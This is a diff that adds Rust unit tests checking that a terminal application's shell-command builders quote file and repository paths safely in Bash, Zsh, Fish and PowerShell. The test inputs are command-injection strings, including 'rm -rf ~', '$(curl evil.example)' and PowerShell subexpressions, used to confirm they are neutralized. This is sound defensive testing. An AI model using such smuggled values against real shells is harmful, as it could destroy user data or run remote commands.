@@ -97,3 +97,100 @@ mod binary_detection {
         assert!(block_on(is_file_content_binary_async(&missing)));
     }
 }
+
+mod path_shell_quoting {
+    use super::super::{build_is_file_path_command, build_is_git_repository_command};
+    use crate::terminal::shell::ShellType;
+
+    #[test]
+    fn is_file_path_quotes_posix_path_as_single_argument() {
+        let command = build_is_file_path_command("/tmp/repo path/file.rs", ShellType::Bash);
+
+        assert_eq!(command, "test -f '/tmp/repo path/file.rs'");
+    }
+
+    #[test]
+    fn is_file_path_neutralizes_posix_substitutions() {
+        let command =
+            build_is_file_path_command("/tmp/x$(touch /tmp/warp-poc)`id`", ShellType::Bash);
+
+        assert_eq!(command, "test -f '/tmp/x$(touch /tmp/warp-poc)`id`'");
+    }
+
+    #[test]
+    fn is_file_path_neutralizes_embedded_quote_posix() {
+        let command = build_is_file_path_command("/tmp/foo'; rm -rf ~; echo '", ShellType::Bash);
+
+        assert_eq!(command, r#"test -f '/tmp/foo'"'"'; rm -rf ~; echo '"'"''"#);
+    }
+
+    #[test]
+    fn is_file_path_quotes_powershell_path_as_single_argument() {
+        let command =
+            build_is_file_path_command(r#"C:\Users\me\file path.rs"#, ShellType::PowerShell);
+
+        assert_eq!(
+            command,
+            r#"if (Test-Path -PathType Leaf 'C:\Users\me\file path.rs') { exit 0 } else { exit 1 }"#
+        );
+    }
+
+    #[test]
+    fn is_file_path_neutralizes_powershell_substitutions() {
+        let command = build_is_file_path_command(
+            r#"C:\tmp\x$(New-Item C:\poc)$env:USERPROFILE"#,
+            ShellType::PowerShell,
+        );
+
+        assert_eq!(
+            command,
+            r#"if (Test-Path -PathType Leaf 'C:\tmp\x$(New-Item C:\poc)$env:USERPROFILE') { exit 0 } else { exit 1 }"#
+        );
+    }
+
+    #[test]
+    fn is_file_path_neutralizes_fish_embedded_quote() {
+        let command = build_is_file_path_command("/tmp/owner's file", ShellType::Fish);
+
+        assert_eq!(command, r"test -f '/tmp/owner\'s file'");
+    }
+
+    #[test]
+    fn is_git_repository_quotes_posix_path_as_single_argument() {
+        let command = build_is_git_repository_command("/tmp/repo path", ShellType::Zsh);
+
+        assert_eq!(command, "git -C '/tmp/repo path' rev-parse");
+    }
+
+    #[test]
+    fn is_git_repository_neutralizes_posix_substitutions() {
+        let command =
+            build_is_git_repository_command("/tmp/x$(curl evil.example)`id`", ShellType::Bash);
+
+        assert_eq!(command, "git -C '/tmp/x$(curl evil.example)`id`' rev-parse");
+    }
+
+    #[test]
+    fn is_git_repository_neutralizes_embedded_quote_posix() {
+        let command =
+            build_is_git_repository_command("/tmp/foo'; rm -rf ~; echo '", ShellType::Bash);
+
+        assert_eq!(
+            command,
+            r#"git -C '/tmp/foo'"'"'; rm -rf ~; echo '"'"'' rev-parse"#
+        );
+    }
+
+    #[test]
+    fn is_git_repository_neutralizes_powershell_substitutions() {
+        let command = build_is_git_repository_command(
+            r#"C:\repo$(New-Item C:\poc)$env:USERPROFILE"#,
+            ShellType::PowerShell,
+        );
+
+        assert_eq!(
+            command,
+            r#"git -C 'C:\repo$(New-Item C:\poc)$env:USERPROFILE' rev-parse"#
+        );
+    }
+}
